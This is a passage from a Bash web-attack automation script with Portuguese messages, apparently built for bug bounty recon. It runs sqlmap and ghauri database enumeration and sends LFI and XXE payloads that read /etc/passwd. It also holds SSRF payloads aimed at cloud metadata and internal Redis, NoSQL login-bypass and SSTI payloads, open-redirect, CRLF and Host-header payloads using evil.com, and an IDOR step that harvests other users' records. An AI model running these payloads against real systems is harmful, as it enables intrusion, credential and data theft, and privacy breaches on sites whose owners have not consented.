  success "16d) SQLMap finalizado"
  info "SQLi confirmados (sqlmap): $(count "$DIR_SCANS/sqli_confirmed.txt")"

  # ── 16e: Ghauri ─────────────────────────────────────────────
  if [[ "$HAS_GHAURI" == "true" ]] && ! is_empty "$DIR_SCANS/sqli_all_targets.txt"; then
    log "16e) Ghauri em $limit_sqli_effective targets..."
    head -n "$limit_sqli_effective" "$DIR_SCANS/sqli_all_targets.txt" | while IFS= read -r url; do
      timeout 120 ghauri -u "$url" \
        --batch \
        --level 3 \
        --random-agent \
        --dbs \
        2>>"$error_log" >> "$DIR_SCANS/ghauri_results.txt" || true
    done
    info "16e) Ghauri: $(count "$DIR_SCANS/ghauri_results.txt") findings"
  fi

  local n_eb n_bt n_post n_sq n_gh
  n_eb=$(count "$DIR_SCANS/sqli_error_based.txt")
  n_bt=$(count "$DIR_SCANS/sqli_blind.txt")
  n_post=$(count "$DIR_SCANS/sqli_post.txt")
  n_sq=$(count "$DIR_SCANS/sqli_confirmed.txt")
  n_gh=$(count "$DIR_SCANS/ghauri_results.txt")
  success "SQLi resumo — Error-based: $n_eb | Blind: $n_bt | POST: $n_post | SQLMap: $n_sq | Ghauri: $n_gh"
}

# ============================================================
# 17 — LFI CHECK
# IMPR v5.0: inject_per_param (per-param injection)
# ============================================================
step_lfi() {
  section "17 / LFI CHECK"
  touch "$DIR_SCANS/lfi_results.txt"

  if is_empty "$DIR_VULNS/lfi.txt"; then
    warn "Nenhum candidato LFI"
    return
  fi

  log "Testando LFI em $(count "$DIR_VULNS/lfi.txt") candidatos (inject_per_param)..."

  local payloads=(
    "../../../../etc/passwd"
    "../../../etc/passwd"
    "../../etc/passwd"
    "../etc/passwd"
    "/etc/passwd"
    "....//....//....//....//etc/passwd"
    "....\/....\/....\/....\/etc/passwd"
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "..%252F..%252Fetc%252Fpasswd"
    "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2Fetc%2Fpasswd"
    "php://filter/convert.base64-encode/resource=index"
    "php://filter/convert.base64-encode/resource=../index"
    "php://filter/read=string.toupper/resource=index.php"
    "php://input"
    "expect://id"
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
    "file:///etc/passwd"
    "/proc/self/environ"
    "/proc/self/cmdline"
    "../../../../windows/win.ini"
    "..\\..\\..\\..\\windows\\win.ini"
  )

  while IFS= read -r url; do
    local found_lfi=false
    for payload in "${payloads[@]}"; do
      "$found_lfi" && break
      local encoded_payload
      encoded_payload=$(url_encode "$payload")

      while IFS= read -r test_url; do
        local tmpf; tmpf=$(mktemp)
        cfetch "$test_url" "$tmpf" >/dev/null
        local resp; resp=$(cat "$tmpf"); rm -f "$tmpf"

        if echo "$resp" | grep -qE "root:x:|bin:x:|daemon:x:|nobody:x:|nologin"; then
          echo "[LFI CONFIRMED] $test_url" >> "$DIR_SCANS/lfi_results.txt"
          echo "  → Payload: $payload | Signature: /etc/passwd" >> "$DIR_SCANS/lfi_results.txt"
          warn "LFI CONFIRMADO (passwd): $test_url"
          found_lfi=true; break
        elif echo "$resp" | grep -qE "\[extensions\]|for 16-bit app|\[fonts\]"; then
          echo "[LFI CONFIRMED - windows/win.ini] $test_url" >> "$DIR_SCANS/lfi_results.txt"
          warn "LFI CONFIRMADO (win.ini): $test_url"
          found_lfi=true; break
        elif [[ "$payload" == *"php://filter"* ]]; then
          local decoded
          decoded=$(echo "$resp" | tr -d '\n' | grep -oE '[A-Za-z0-9+/]{40,}={0,2}' \
            | head -1 | base64 -d 2>/dev/null || true)
          if echo "$decoded" | grep -qE "root:x:|<\?php"; then
            echo "[LFI CONFIRMED via base64-filter] $test_url" >> "$DIR_SCANS/lfi_results.txt"
            warn "LFI CONFIRMADO (php filter): $test_url"
            found_lfi=true; break
          fi
        fi
        curl_throttle
      done < <(inject_per_param "$url" "$encoded_payload")
    done
  done < <(head -n "$limit_lfi" "$DIR_VULNS/lfi.txt")

  success "LFI confirmados: $(count "$DIR_SCANS/lfi_results.txt")"
}

# ============================================================
# 18 — OPEN REDIRECT CHECK
# IMPR v5.0: inject_per_param
# ============================================================
step_redirect() {
  section "18 / OPEN REDIRECT CHECK"
  touch "$DIR_SCANS/redirect_results.txt"

  if is_empty "$DIR_VULNS/redirect.txt"; then
    warn "Nenhum candidato open redirect"
    return
  fi

  log "Testando redirect em $(count "$DIR_VULNS/redirect.txt") candidatos (inject_per_param)..."

  local payloads=(
    "https://evil.com"
    "//evil.com"
    "//evil%2ecom"
    "///evil.com"
    "////evil.com"
    "/\\evil.com"
    "https:evil.com"
    "https://evil.com%23"
    "https://evil.com%3F"
    "@evil.com"
    "evil.com%2F%2E%2E"
    "javascript:alert(1)"
    "data:text/html,<script>location='https://evil.com'</script>"
  )

  while IFS= read -r url; do
    local found_redir=false
    for payload in "${payloads[@]}"; do
      "$found_redir" && break
      local enc_payload
      enc_payload=$(url_encode "$payload")

      while IFS= read -r test_url; do
        local location
        location=$(curl -sk --max-time "$timeout" -I "$test_url" 2>>"$error_log" \
          | grep -i "^location:" | tr -d '\r')
        if echo "$location" | grep -qiE "evil\.com|evil%2ecom"; then
          echo "[REDIRECT VULN] $test_url" >> "$DIR_SCANS/redirect_results.txt"
          echo "  → Location: $location" >> "$DIR_SCANS/redirect_results.txt"
          warn "REDIRECT confirmado: $test_url"
          found_redir=true; break
        fi
        curl_throttle
      done < <(inject_per_param "$url" "$enc_payload")
    done
  done < <(head -n "$limit_redirect" "$DIR_VULNS/redirect.txt")

  success "Open redirects confirmados: $(count "$DIR_SCANS/redirect_results.txt")"
}

# ============================================================
# 18b — NoSQL INJECTION
# FIX v5.0: POST JSON via json.dumps correto
# ============================================================
step_nosql() {
  section "18b / NoSQL INJECTION"
  touch "$DIR_SCANS/nosql_results.txt"

  if is_empty "$DIR_PARAMS/params_alive.txt"; then
    warn "Sem parâmetros ativos para NoSQL test"
    return
  fi

  log "Testando NoSQL injection (MongoDB/Redis patterns)..."

  while IFS= read -r url; do
    for payload in '[$gt]=' '[$ne]=0' '[$regex]=.*'; do
      local test_url
      test_url=$(echo "$url" | sed "s|=[^&]*|$payload|g")
      local tmpf; tmpf=$(mktemp)
      local status; status=$(cfetch "$test_url" "$tmpf")
      local resp; resp=$(cat "$tmpf"); rm -f "$tmpf"

      if [[ "$status" == "200" ]] && echo "$resp" | grep -qiE "(username|email|password|user|admin|data|results)"; then
        echo "[NoSQL VULN GET] $test_url" >> "$DIR_SCANS/nosql_results.txt"
        warn "NoSQL potencial (GET): $test_url"
      fi
    done

    # FIX: json.dumps correto para payloads de operadores MongoDB
    for op_payload in '{"$ne": null}' '{"$gt": ""}' '{"$regex": ".*"}'; do
      # Serializa com python3 para garantir JSON válido
      local json_body
      json_body=$(python3 -c "
import json, sys
op = sys.argv[1]
import ast
p = ast.literal_eval(op)
print(json.dumps({'username': p, 'password': p}))
" "$op_payload" 2>/dev/null || echo "{\"username\":{},\"password\":{}}")

      local tmpf; tmpf=$(mktemp)
      local status; status=$(curl -sk --max-time "$timeout" \
        -o "$tmpf" -w "%{http_code}" \
        -X POST -H "Content-Type: application/json" \
        -d "$json_body" \
        "$url" 2>/dev/null)

      if [[ "$status" == "200" ]]; then
        local resp; resp=$(cat "$tmpf")
        if echo "$resp" | grep -qiE "(token|session|logged|welcome|dashboard|success)"; then
          echo "[NoSQL VULN POST] $url — payload: $op_payload" >> "$DIR_SCANS/nosql_results.txt"
          warn "NoSQL CONFIRMADO (POST): $url"
        fi
      fi
      rm -f "$tmpf"
    done
    curl_throttle
  done < <(head -n 30 "$DIR_PARAMS/params_alive.txt")

  info "NoSQL findings: $(count "$DIR_SCANS/nosql_results.txt")"
}

# ============================================================
# 18c — SSTI ACTIVE PROBE
# FIX v5.0: url_encode usa sys.argv (sem bug de single-quote)
# IMPR: inject_per_param
# ============================================================
step_ssti_active() {
  section "18c / SSTI ACTIVE PROBE"
  touch "$DIR_SCANS/ssti_results.txt"

  if is_empty "$DIR_VULNS/ssti.txt"; then
    warn "Nenhum candidato SSTI"
    return
  fi

  log "Testando SSTI em $(count "$DIR_VULNS/ssti.txt") candidatos (inject_per_param)..."

  declare -A ssti_tests
  ssti_tests["{{7*7}}"]="49"
  ssti_tests['${7*7}']="49"
  ssti_tests["<%= 7*7 %>"]="49"
  ssti_tests["#{7*7}"]="49"
  ssti_tests["{{7*'7'}}"]="7777777"
  ssti_tests["{{'a'.upper()}}"]="A"
  ssti_tests["{{config}}"]="SECRET_KEY\|DEBUG\|DATABASE"
  ssti_tests["*{7*7}"]="49"
  ssti_tests["\${7*7}"]="49"

  while IFS= read -r url; do
    for payload in "${!ssti_tests[@]}"; do
      local expected="${ssti_tests[$payload]}"
      # FIX: url_encode usa sys.argv — sem bug com payloads que contêm aspas simples
      local encoded
      encoded=$(url_encode "$payload")

      while IFS= read -r test_url; do
        local resp
        resp=$(curl -sk --max-time "$timeout" "$test_url" 2>/dev/null)
        if echo "$resp" | grep -qE "$expected"; then
          echo "[SSTI CONFIRMED] $test_url" >> "$DIR_SCANS/ssti_results.txt"
          echo "  → Payload: $payload → Esperado: $expected" >> "$DIR_SCANS/ssti_results.txt"
          warn "SSTI CONFIRMADO: $test_url (payload: $payload)"
          break
        fi
        curl_throttle
      done < <(inject_per_param "$url" "$encoded")
    done
  done < <(head -n 30 "$DIR_VULNS/ssti.txt")

  success "SSTI confirmados: $(count "$DIR_SCANS/ssti_results.txt")"
}

# ============================================================
# 18d — SSRF ACTIVE CHECK
# IMPR: inject_per_param
# ============================================================
step_ssrf_active() {
  section "18d / SSRF ACTIVE CHECK"
  touch "$DIR_SCANS/ssrf_results.txt"

  if is_empty "$DIR_VULNS/ssrf.txt"; then
    warn "Nenhum candidato SSRF"
    return
  fi

  if [[ "$HAS_INTERACTSH" != "true" ]]; then
    warn "interactsh-client não encontrado — testando com canary manual"

    local ssrf_payloads=(
      "http://169.254.169.254/latest/meta-data/"
      "http://169.254.169.254/latest/user-data/"
      "http://metadata.google.internal/computeMetadata/v1/"
      "http://100.100.100.200/latest/meta-data/"
      "http://127.0.0.1:22"
      "http://127.0.0.1:3306"
      "http://127.0.0.1:6379"
      "http://localhost"
      "http://0.0.0.0"
      "http://[::1]"
      "dict://127.0.0.1:6379/info"
      "gopher://127.0.0.1:9200/_cat/indices"
    )

    while IFS= read -r url; do
      for payload in "${ssrf_payloads[@]}"; do
        local enc_payload
        enc_payload=$(url_encode "$payload")

        while IFS= read -r test_url; do
          local tmpf; tmpf=$(mktemp)
          local status; status=$(cfetch "$test_url" "$tmpf")
          local resp; resp=$(cat "$tmpf"); rm -f "$tmpf"

          if echo "$resp" | grep -qiE "(ami-id|instance-id|computeMetadata|redis_version|INSTANCE_ID|user_data)"; then
            echo "[SSRF CONFIRMED] $test_url" >> "$DIR_SCANS/ssrf_results.txt"
            echo "  → Payload: $payload" >> "$DIR_SCANS/ssrf_results.txt"
            error "SSRF CRÍTICO CONFIRMADO: $test_url"
          elif [[ "$status" == "200" ]] && echo "$resp" | grep -qiE "(root:|hostname|internal)"; then
            echo "[SSRF POSSIBLE] $test_url" >> "$DIR_SCANS/ssrf_results.txt"
          fi
          curl_throttle
        done < <(inject_per_param "$url" "$enc_payload")
      done
    done < <(head -n 20 "$DIR_VULNS/ssrf.txt")
  else
    log "Usando interactsh para detecção SSRF fora de banda..."
    local interactsh_host
    interactsh_host=$(interactsh-client -json 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('interactsh-url',''))" 2>/dev/null || true)

    if [[ -n "$interactsh_host" ]]; then
      while IFS= read -r url; do
        local callback
        callback=$(url_encode "http://${interactsh_host}")
        while IFS= read -r test_url; do
          curl -sk --max-time "$timeout" "$test_url" 2>/dev/null || true
          curl_throttle
        done < <(inject_per_param "$url" "$callback")
      done < <(head -n 20 "$DIR_VULNS/ssrf.txt")
      warn "SSRF interactsh: verifique callbacks em $interactsh_host manualmente"
    fi
  fi

  success "SSRF findings: $(count "$DIR_SCANS/ssrf_results.txt")"
}

# ============================================================
# 18e — XXE INJECTION
# ============================================================
step_xxe() {
  section "18e / XXE INJECTION"
  touch "$DIR_SCANS/xxe_results.txt"

  log "Buscando endpoints XML/SOAP..."
  grep -iE "(xml|soap|wsdl|rss|atom|upload)" "$DIR_URLS/urls_clean.txt" \
    | sort -u > "$DIR_SCANS/xxe_candidates.txt" 2>/dev/null || touch "$DIR_SCANS/xxe_candidates.txt"

  info "Candidatos XML: $(count "$DIR_SCANS/xxe_candidates.txt")"

  if is_empty "$DIR_SCANS/xxe_candidates.txt"; then
    info "Nenhum endpoint XML identificado"
    return
  fi

  local xxe_payloads=(
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>'
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><foo/>'
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
  )

  log "Testando XXE em $(count "$DIR_SCANS/xxe_candidates.txt") endpoints..."
  while IFS= read -r url; do
    for payload in "${xxe_payloads[@]}"; do
      local tmpf; tmpf=$(mktemp)
      curl -sk --max-time "$timeout" \
        -X POST \
        -H "Content-Type: application/xml" \
        -d "$payload" \
        -o "$tmpf" \
        "$url" 2>/dev/null
      local resp; resp=$(cat "$tmpf"); rm -f "$tmpf"

      if echo "$resp" | grep -qE "root:x:|bin:x:|daemon:|hostname|for 16-bit"; then
        echo "[XXE CONFIRMED] $url" >> "$DIR_SCANS/xxe_results.txt"
        echo "  → Payload: ${payload:0:80}..." >> "$DIR_SCANS/xxe_results.txt"
        error "XXE CONFIRMADO: $url"
        break
      fi
      curl_throttle
    done
  done < <(head -n 20 "$DIR_SCANS/xxe_candidates.txt")

  success "XXE findings: $(count "$DIR_SCANS/xxe_results.txt")"
}

# ============================================================
# 18f — IDOR CHECK
# PERF v5.0: cfetch() — uma curl call por request (era 2 em v4.0)
# ============================================================
step_idor() {
  section "18f / IDOR CHECK"
  touch "$DIR_SCANS/idor_results.txt" "$DIR_SCANS/idor_candidates.txt"

  grep -iE "[?&](id|user_id|account|uid|userid|pid|post_id|order_id|invoice_id|file_id|doc_id|item_id|record_id|profile_id|customer_id|ticket_id)=[0-9]+" \
    "$DIR_PARAMS/params_alive.txt" 2>/dev/null | sort -u > "$DIR_SCANS/idor_candidates.txt"

  info "Candidatos IDOR (params numéricos): $(count "$DIR_SCANS/idor_candidates.txt")"

  if is_empty "$DIR_SCANS/idor_candidates.txt"; then
    info "Nenhum candidato IDOR numérico — pulando"
    return
  fi

  log "Testando IDOR em $(count "$DIR_SCANS/idor_candidates.txt") URLs (limit: $limit_idor)..."

  while IFS= read -r url; do
    # PERF: cfetch — único curl retorna status e body
    local tmpf_base; tmpf_base=$(mktemp)
    local base_status; base_status=$(cfetch "$url" "$tmpf_base")
    local base_resp; base_resp=$(cat "$tmpf_base"); rm -f "$tmpf_base"
    local base_len=${#base_resp}

    [[ "$base_status" != "200" ]] && continue

    local orig_id
    orig_id=$(echo "$url" | grep -oP '(?<=[?&](id|user_id|uid|userid|pid|post_id|order_id|account|invoice_id|file_id|doc_id|item_id|record_id|profile_id|customer_id|ticket_id)=)\d+' | head -1)
    [[ -z "$orig_id" ]] && continue

    for new_id in $(( orig_id + 1 )) $(( orig_id - 1 )) 1 2 0 9999 99999; do
      [[ $new_id -lt 0 ]]     && continue
      [[ $new_id -eq $orig_id ]] && continue

      local test_url
      test_url=$(echo "$url" | sed -E "s/([?&](id|user_id|uid|userid|pid|post_id|order_id|account|invoice_id|file_id|doc_id|item_id|record_id|profile_id|customer_id|ticket_id)=)[0-9]+/\1${new_id}/")

      # PERF: cfetch — único curl (era 2 chamadas separadas em v4.0)
      local tmpf; tmpf=$(mktemp)
      local test_status; test_status=$(cfetch "$test_url" "$tmpf")
      local test_resp; test_resp=$(cat "$tmpf"); rm -f "$tmpf"
      local test_len=${#test_resp}

      if [[ "$test_status" == "200" ]]; then
        local len_diff=$(( test_len - base_len ))
        [[ $len_diff -lt 0 ]] && len_diff=$(( -len_diff ))

        local pii_found=false
        echo "$test_resp" | grep -qiE "(email|username|password|ssn|cpf|phone|address|credit_card|date_of_birth|national_id)" \
          && pii_found=true

        if [[ $len_diff -gt 100 ]] || [[ "$pii_found" == "true" ]]; then
          echo "[IDOR POSSIBLE] URL original: $url" >> "$DIR_SCANS/idor_results.txt"
          echo "  → URL testada: $test_url" >> "$DIR_SCANS/idor_results.txt"
          echo "  → ID: $orig_id → $new_id | Status: $test_status | Diff: ${len_diff}B | PII: $pii_found" >> "$DIR_SCANS/idor_results.txt"
          warn "IDOR possível: $url (ID $orig_id → $new_id, diff ${len_diff}B)"
          break
        fi
      fi
      curl_throttle
    done
  done < <(head -n "$limit_idor" "$DIR_SCANS/idor_candidates.txt")

  success "IDOR suspeitos: $(count "$DIR_SCANS/idor_results.txt")"
}

# ============================================================
# 18g — CRLF INJECTION
# IMPR v5.0: inject_per_param
# ============================================================
step_crlf() {
  section "18g / CRLF INJECTION"
  touch "$DIR_SCANS/crlf_results.txt"

  if is_empty "$DIR_PARAMS/params_alive.txt"; then
    warn "Sem parâmetros ativos para CRLF test"
    return
  fi

  local payloads=(
    '%0d%0aX-CRLF-Injected: test'
    '%0aX-CRLF-Injected: test'
    '%0d%0a%20X-CRLF-Injected: test'
    '%E5%98%8D%E5%98%8AX-CRLF-Injected: test'
    '%E5%98%8D%E5%98%8A%09X-CRLF-Injected: test'
    '%0d%0aSet-Cookie: crlf_injected=1;%20HttpOnly'
    '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK'
    'foo%0d%0aX-CRLF-Injected: test'
    'foo%0d%0aLocation: https://evil.com'
  )

  local effective_limit=$(( $(count "$DIR_PARAMS/params_alive.txt") < limit_crlf ? $(count "$DIR_PARAMS/params_alive.txt") : limit_crlf ))
  log "Testando CRLF injection em $effective_limit URLs (inject_per_param)..."

  while IFS= read -r url; do
    local found_crlf=false
    for payload in "${payloads[@]}"; do
      "$found_crlf" && break

      # CRLF payloads já estão URL-encoded, passamos direto
      while IFS= read -r test_url; do
        local tmpf; tmpf=$(mktemp)
        cfetch_headers "$test_url" "$tmpf" >/dev/null
        local resp_headers; resp_headers=$(cat "$tmpf"); rm -f "$tmpf"

        if echo "$resp_headers" | grep -qiE "X-CRLF-Injected:|crlf_injected="; then
          echo "[CRLF CONFIRMED] $test_url" >> "$DIR_SCANS/crlf_results.txt"
          echo "  → Payload: $payload | Header injetado confirmado" >> "$DIR_SCANS/crlf_results.txt"
          warn "CRLF CONFIRMADO: $test_url"
          found_crlf=true; break
        fi

        if echo "$resp_headers" | grep -i "^location:" | grep -qi "evil.com"; then
          echo "[CRLF HEADER SPLIT] $test_url" >> "$DIR_SCANS/crlf_results.txt"
          echo "  → Header splitting levou a redirect externo" >> "$DIR_SCANS/crlf_results.txt"
          warn "CRLF Header Splitting: $test_url"
          found_crlf=true; break
        fi
        curl_throttle
      done < <(inject_per_param "$url" "$payload")
    done
  done < <(head -n "$limit_crlf" "$DIR_PARAMS/params_alive.txt")

  success "CRLF findings: $(count "$DIR_SCANS/crlf_results.txt")"
}

# ============================================================
# 18h — HOST HEADER INJECTION
# FIX v5.0: usa limit_waf para limitar hosts testados
# ============================================================
step_host_injection() {
  section "18h / HOST HEADER INJECTION"
  touch "$DIR_SCANS/host_injection_results.txt"

  if is_empty "$DIR_DISC/alive.txt"; then
    warn "Sem hosts ativos para Host Injection test"
    return
  fi

  local evil_hosts=(
    "evil.com"
    "evil.com:80"
    "${domain}.evil.com"
    "evil.com#${domain}"
    "evil.com%0d%0aX-Injected: test"
  )

  log "Testando Host Header Injection em $(( $(count "$DIR_DISC/alive.txt") < limit_waf ? $(count "$DIR_DISC/alive.txt") : limit_waf )) hosts..."

  while IFS= read -r url; do
    for evil in "${evil_hosts[@]}"; do
      local resp_body
      resp_body=$(curl -sk --max-time "$timeout" \
        -H "Host: $evil" \
        -H "X-Forwarded-Host: $evil" \
        -H "X-Host: $evil" \
        "$url" 2>/dev/null)

      if echo "$resp_body" | grep -qiF "$evil"; then
        echo "[HOST INJECTION — Body Reflection] $url" >> "$DIR_SCANS/host_injection_results.txt"
        echo "  → Host injetado '$evil' refletido no body" >> "$DIR_SCANS/host_injection_results.txt"
        echo "  → Risco: password reset poisoning / cache poisoning" >> "$DIR_SCANS/host_injection_results.txt"
        warn "Host Header Injection (body): $url → '$evil'"
        break
      fi

      local resp_loc
      resp_loc=$(curl -sk --max-time "$timeout" -I \
        -H "Host: $evil" \
        "$url" 2>/dev/null | grep -i "^location:" | tr -d '\r')

      if echo "$resp_loc" | grep -qiF "$evil"; then
        echo "[HOST INJECTION — Redirect] $url" >> "$DIR_SCANS/host_injection_results.txt"
        echo "  → Location: $resp_loc" >> "$DIR_SCANS/host_injection_results.txt"
        warn "Host Header Injection (redirect): $url"
        break
      fi
      curl_throttle
    done
  done < <(head -n "$limit_waf" "$DIR_DISC/alive.txt")

  success "Host injection findings: $(count "$DIR_SCANS/host_injection_results.txt")"
}

# ============================================================
# 18i — GRAPHQL RECON
# FIX v5.0: usa limit_waf para limitar hosts testados
# ============================================================
step_graphql() {
  section "18i / GRAPHQL RECON"
  touch "$DIR_SCANS/graphql_results.txt"

  if is_empty "$DIR_DISC/alive.txt"; then
    warn "Sem hosts ativos para GraphQL recon"
    return
  fi

  local gql_endpoints=(
    "/graphql"       "/graphql/v1"    "/graphql/v2"
    "/api/graphql"   "/api/v1/graphql" "/api/v2/graphql"
    "/v1/graphql"    "/v2/graphql"
    "/query"         "/gql"
    "/graph"         "/graphiql"       "/playground"
    "/altair"        "/api"
  )

  local introspection_query='{"query":"{ __schema { queryType { name } types { name kind } } }"}'
  local deep_query='{"query":"{ __schema { types { name kind fields { name type { name kind } } } } }"}'

  log "Testando $(echo "${gql_endpoints[@]}" | wc -w) endpoints GraphQL em $(( $(count "$DIR_DISC/alive.txt") < limit_waf ? $(count "$DIR_DISC/alive.txt") : limit_waf )) hosts..."

  while IFS= read -r host; do
    for ep in "${gql_endpoints[@]}"; do
      local url="${host}${ep}"
      local tmpf; tmpf=$(mktemp)
      local status
      status=$(curl -sk --max-time "$timeout" \
        -o "$tmpf" -w "%{http_code}" \
        -X POST -H "Content-Type: application/json" \
        -d "$introspection_query" "$url" 2>/dev/null)
      local resp; resp=$(cat "$tmpf"); rm -f "$tmpf"

      if [[ "$status" =~ ^(200|201)$ ]]; then
        if echo "$resp" | grep -qE '"__schema"|"queryType"|"data"\s*:\s*\{'; then
          echo "[GraphQL INTROSPECTION ENABLED] $url" >> "$DIR_SCANS/graphql_results.txt"
          warn "GraphQL introspection habilitada: $url"

          if [[ "$HAS_PYTHON3" == "true" ]]; then
            local deep_resp
            deep_resp=$(curl -sk --max-time $((timeout + 5)) \
              -A "$(random_ua)" \
              -X POST -H "Content-Type: application/json" \
              -d "$deep_query" "$url" 2>/dev/null)

            # v1.0 FIX: passa deep_resp via stdin (variável no heredoc causava injection)
            echo "$deep_resp" | python3 - >> "$DIR_SCANS/graphql_results.txt" 2>/dev/null <<'PYEOF'
import sys, json
try:
    raw = sys.stdin.read()
    d = json.loads(raw)
    types = d.get('data', {}).get('__schema', {}).get('types', [])
    user_types = [t for t in types if not t.get('name', '').startswith('__')]
    print("  → Tipos encontrados: " + str(len(user_types)))
    for t in user_types[:15]:
        fields = t.get('fields') or []
        field_names = [f['name'] for f in fields[:5]]
        if field_names:
            print(f"    {t['name']} ({t['kind']}): {', '.join(field_names)}")
        else:
            print(f"    {t['name']} ({t['kind']})")
except Exception as e:
    print(f"  → Parse error: {e}")
PYEOF
          fi
        fi
      fi
      curl_throttle
    done
  done < <(head -n "$limit_waf" "$DIR_DISC/alive.txt")

  success "GraphQL findings: $(count "$DIR_SCANS/graphql_results.txt")"
}

# ============================================================
# 19 — NUCLEI SCAN
# ============================================================
step_nuclei() {
  section "19 / NUCLEI SCAN"

  log "Atualizando templates Nuclei..."
  nuclei -update-templates -silent 2>>"$error_log" || true

  log "Rodando Nuclei nos hosts ativos..."
  nuclei \
    -l "$DIR_DISC/alive.txt" \
    -silent \
    -severity medium,high,critical \
    -tags php,sqli,xss,lfi,rce,ssrf,exposure,misconfig,default-login,cve,takeover,cors \
    -rate-limit "$rate_limit" \
    -bulk-size 25 \
    -timeout "$timeout" \
    -o "$DIR_SCANS/nuclei_hosts.txt" 2>>"$error_log" || touch "$DIR_SCANS/nuclei_hosts.txt"

  success "Nuclei (hosts): $(count "$DIR_SCANS/nuclei_hosts.txt") findings"

  if ! is_empty "$DIR_PARAMS/params_alive.txt"; then
    log "Rodando Nuclei nas URLs com parâmetros..."
    nuclei \
      -l "$DIR_PARAMS/params_alive.txt" \
      -silent \
      -severity medium,high,critical \
      -tags fuzz,sqli,xss,lfi,ssti,ssrf,rce \
      -rate-limit "$rate_limit" \
      -bulk-size 25 \
      -timeout "$timeout" \
      -o "$DIR_SCANS/nuclei_params.txt" 2>>"$error_log" || touch "$DIR_SCANS/nuclei_params.txt"
    success "Nuclei (params): $(count "$DIR_SCANS/nuclei_params.txt") findings"
  fi

  cat "$DIR_SCANS/nuclei_hosts.txt" "$DIR_SCANS/nuclei_params.txt" 2>/dev/null \
    | sort -u > "$DIR_SCANS/nuclei_all.txt" 2>/dev/null || touch "$DIR_SCANS/nuclei_all.txt"

  grep -i "\[critical\]" "$DIR_SCANS/nuclei_all.txt" > "$DIR_SCANS/nuclei_critical.txt" 2>/dev/null || touch "$DIR_SCANS/nuclei_critical.txt"
  grep -i "\[high\]"     "$DIR_SCANS/nuclei_all.txt" > "$DIR_SCANS/nuclei_high.txt"     2>/dev/null || touch "$DIR_SCANS/nuclei_high.txt"
  grep -i "\[medium\]"   "$DIR_SCANS/nuclei_all.txt" > "$DIR_SCANS/nuclei_medium.txt"   2>/dev/null || touch "$DIR_SCANS/nuclei_medium.txt"

  [[ $(count "$DIR_SCANS/nuclei_critical.txt") -gt 0 ]] && error  "Nuclei CRITICAL: $(count "$DIR_SCANS/nuclei_critical.txt")"
  [[ $(count "$DIR_SCANS/nuclei_high.txt")     -gt 0 ]] && warn   "Nuclei HIGH    : $(count "$DIR_SCANS/nuclei_high.txt")"
  [[ $(count "$DIR_SCANS/nuclei_medium.txt")   -gt 0 ]] && info   "Nuclei MEDIUM  : $(count "$DIR_SCANS/nuclei_medium.txt")"
}

# ============================================================
# 19b — AI TRIAGE via Anthropic API
# ============================================================
step_ai_triage() {
  section "19b / AI TRIAGE (Anthropic API)"

  if [[ -z "$anthropic_api_key" ]]; then
    warn "Chave API não fornecida — use: ./recon.sh alvo.com --api-key sk-ant-..."
    info "O AI Triage analisa todos os findings e gera relatório de prioridade"
    return
  fi

  if ! command -v curl &>/dev/null || [[ "$HAS_PYTHON3" != "true" ]]; then
    warn "curl e python3 necessários para AI triage"
    return
  fi

  log "Coletando findings para análise IA..."

  local findings=""
  findings+="=== ALVO: $domain ===\n"
  findings+="=== XSS Manual pre-check ($(count "$DIR_SCANS/xss_manual.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/xss_manual.txt" 2>/dev/null)\n\n"
  findings+="=== XSS Dalfox confirmados ($(count "$DIR_SCANS/dalfox.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/dalfox.txt" 2>/dev/null)\n\n"
  findings+="=== XSS DOM ($(count "$DIR_SCANS/xss_dom.txt")) ===\n"
  findings+="$(head -5 "$DIR_SCANS/xss_dom.txt" 2>/dev/null)\n\n"
  findings+="=== SQLi error-based ($(count "$DIR_SCANS/sqli_error_based.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/sqli_error_based.txt" 2>/dev/null)\n\n"
  findings+="=== SQLi blind time-based ($(count "$DIR_SCANS/sqli_blind.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/sqli_blind.txt" 2>/dev/null)\n\n"
  findings+="=== SQLi POST ($(count "$DIR_SCANS/sqli_post.txt")) ===\n"
  findings+="$(head -5 "$DIR_SCANS/sqli_post.txt" 2>/dev/null)\n\n"
  findings+="=== SQLi confirmados sqlmap ($(count "$DIR_SCANS/sqli_confirmed.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/sqli_confirmed.txt" 2>/dev/null)\n\n"
  findings+="=== IDOR ($(count "$DIR_SCANS/idor_results.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/idor_results.txt" 2>/dev/null)\n\n"
  findings+="=== CRLF ($(count "$DIR_SCANS/crlf_results.txt")) ===\n"
  findings+="$(head -5 "$DIR_SCANS/crlf_results.txt" 2>/dev/null)\n\n"
  findings+="=== Host Injection ($(count "$DIR_SCANS/host_injection_results.txt")) ===\n"
  findings+="$(head -5 "$DIR_SCANS/host_injection_results.txt" 2>/dev/null)\n\n"
  findings+="=== GraphQL ($(count "$DIR_SCANS/graphql_results.txt")) ===\n"
  findings+="$(head -10 "$DIR_SCANS/graphql_results.txt" 2>/dev/null)\n\n"
  findings+="=== SSTI ($(count "$DIR_SCANS/ssti_results.txt")) | SSRF ($(count "$DIR_SCANS/ssrf_results.txt")) | XXE ($(count "$DIR_SCANS/xxe_results.txt")) ===\n"
  findings+="$(head -5 "$DIR_SCANS/ssti_results.txt" 2>/dev/null)\n"
